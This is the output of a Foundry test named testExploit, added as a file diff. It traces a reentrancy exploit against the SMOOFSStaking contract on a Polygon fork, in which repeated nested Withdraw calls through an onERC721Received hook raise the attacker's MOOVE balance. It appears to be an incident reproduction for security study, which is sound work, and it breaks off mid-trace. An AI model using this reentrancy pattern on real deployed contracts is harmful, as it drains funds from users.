@@ -1,0 +1,585 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/SMOOFSStaking_exp.sol:ContractTest
+[PASS] testExploit() (gas: 27357825)
+Logs:
+  Attacker MOOVE balance before exploit: 52850.000000000000000000
+  Attacker MOOVE balance after exploit: 57200.000000000000000000
+
+Traces:
+  [6519] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("polygon", 54056707 [5.405e7])
+    │   └─ ← [Return] 0
+    ├─ [0] VM::label(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], "SMOOFSStaking")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Smoofs: [0x551eC76C9fbb4F705F6b0114d1B79bb154747D38], "Smoofs")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], "MOOVE")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5], "attackContract")
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+  [28461325] ContractTest::testExploit()
+    ├─ [0] VM::prank(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5])
+    │   └─ ← [Return]
+    ├─ [69187] Smoofs::transferFrom(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   ├─ emit Transfer(from: attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   ├─  storage changes:
+    │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 0 → 1
+    │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x000000000000000000000000367120bf791cc03f040e2574aea0ca7790d3d2e5 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 0 → 2062
+    │   │   @ 0xca78207dd92fec648b46373e59574d5f00e374b0d671f928ebe4af5abfef75ec: 1 → 0
+    │   │   @ 0x120e695dc3205a7ba70a08e1832d8a5ec20d8673f04553f81ed6620b8024948c: 2062 → 0
+    │   └─ ← [Stop]
+    ├─ [25422] Smoofs::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], approved: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   ├─  storage changes:
+    │   │   @ 0xcd9d2c65adc5bd05d210fece84d68698b15c4f5fceb44e39230148b55fb0341c: 0 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   └─ ← [Stop]
+    ├─ [7889] MOOVE::balanceOf(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5]) [staticcall]
+    │   ├─ [2941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5]) [delegatecall]
+    │   │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    ├─ [3389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [2941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::record()
+    │   └─ ← [Return]
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::accesses(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d])
+    │   └─ ← [Return] [0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c], []
+    ├─ [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ emit WARNING_UninitedSlot(who: MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], slot: 74853195267810777783406347969109249098520047384766759631747282568800094505100 [7.485e76])
+    ├─ [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Return] 0
+    ├─ [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
+    │   └─ ← [Return]
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
+    ├─ [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ emit SlotFound(who: MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 74853195267810777783406347969109249098520047384766759631747282568800094505100 [7.485e76])
+    ├─ [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
+    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    ├─ [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0x000000000000000000000000000000000000000000000b310115ecb302880000)
+    │   └─ ← [Return]
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    ├─ [25893] MOOVE::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   ├─ [25442] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
+    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x587a7efa743c4c812787e03ded34b13cd039590c23d13e2c17894dbfe8c23944: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    │   └─ ← [Return] 52850000000000000000000 [5.285e22]
+    ├─ [834] MOOVE::decimals() [staticcall]
+    │   ├─ [389] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::decimals() [delegatecall]
+    │   │   └─ ← [Return] 18
+    │   └─ ← [Return] 18
+    ├─ emit log_named_decimal_uint(key: "Attacker MOOVE balance before exploit", val: 52850000000000000000000 [5.285e22], decimals: 18)
+    ├─ [8375330] SMOOFSStaking::Stake(2062)
+    │   ├─ [8370440] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Stake(2062) [delegatecall]
+    │   │   ├─ [602] Smoofs::ownerOf(2062) [staticcall]
+    │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
+    │   │   ├─ [12300] MOOVE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 500000000000000000000 [5e20])
+    │   │   │   ├─ [11843] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 500000000000000000000 [5e20]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f6ab8a83b0ae4f6a28d → 0x000000000000000000000000000000000000000000008f85d38d11edd446a28d
+    │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b310115ecb302880000 → 0x000000000000000000000000000000000000000000000b15e63115d013380000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [59850] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   @ 0xcd9d2c65adc5bd05d210fece84d68698b15c4f5fceb44e39230148b55fb0341c: 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c → 0
+    │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   └─ ← [Stop]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf3f7a9fe364faab93b216da50a3214154f22a0a2b415b23a84c8169e8b637a09: 0 → 2062
+    │   │   │   @ 0x5f6eee5777689fac8d5a6d5f66349ac0b0aaf490b4d918486710d1c6412d3a72: 0 → 1
+    │   │   │   @ 9: 273 → 274
+    │   │   │   @ 12: 1090 → 1091
+    │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97547: 0 → 0x0000000000000000000000000000000000000000000000000000000065df1afe
+    │   │   │   @ 0x6e1540171b6c0c960b71a7020d9f60077f6af931a8bbf590da0223dacf75c8c0: 0 → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 13: 2847 → 2848
+    │   │   │   @ 8: 2854 → 2855
+    │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97546: 0 → 0x00000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600
+    │   │   │   @ 0x86935f44ff27c626cca4651a451c8e1efe7133f7038398be5387e4f3c2a97549: 0 → 0x000000000000000000000000000000000000000000000000000000000338d703
+    │   │   │   @ 0x4c882eda9426d58c8d2738e21e10e7ea3aaef11461d38d11972284555c393f2f: 0 → 2062
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [19661847] SMOOFSStaking::Withdraw(2062, true)
+    │   ├─ [19661454] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   ├─ [5500] MOOVE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 150000000000000000000 [1.5e20])
+    │   │   │   ├─ [5043] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 150000000000000000000 [1.5e20]) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 150000000000000000000 [1.5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xd5ab825b6dd1b7897ca70576be357c4e8183b919d787ed3f8b5032cc1dc086d5: 0x000000000000000000000000000000000000000000008f85d38d11edd446a28d → 0x000000000000000000000000000000000000000000008f8df5381f31e8dea28d
+    │   │   │   │   │   @ 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c: 0x000000000000000000000000000000000000000000000b15e63115d013380000 → 0x000000000000000000000000000000000000000000000b0dc486088bfea00000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   │   │   ├─ [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
+    │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [17760459] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   ├─ [17712729] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [17634712] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   ├─ [17634319] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   ├─ [15774225] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   ├─ [15726495] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   ├─ [15670378] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   ├─ [15669985] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   ├─ [13809891] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   ├─ [13762161] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x150b7a02
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x7c117341df68735633c679d42fd311ec761ef3ff455a3b2ed6e941ed2e5f1d49: 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496 → 0x000000000000000000000000757c2d1ef0942f7a1b9fc1e618aea3a6f3441a3c
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x9a37937c0ede8c307bf0496ec60e131422d44420befc187978dc5326d56d38a4: 1 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x03d3573a17426ddd2d70a2328dbdfe4931b03559fffffb811a86bfdf5aef0015: 0 → 2854
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x3ecec7598e7b34ca46620c00089e7d5cfe8e79bcc0e5fe33891dd5ad91c706fa: 2854 → 2855
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x93ddb050f4765c302625485e714a8c927b92c259399c227557271c104da0bc2e: 2062 → 0
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   @ 0x1e78e334e5cc6b03da7b3b1554806319f51c4d506bbdd3a721a627a86832057f: 0 → 2062
+    │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13706044] SMOOFSStaking::Withdraw(2062, true)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [13705651] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11845557] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2062)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [11797827] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
+    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
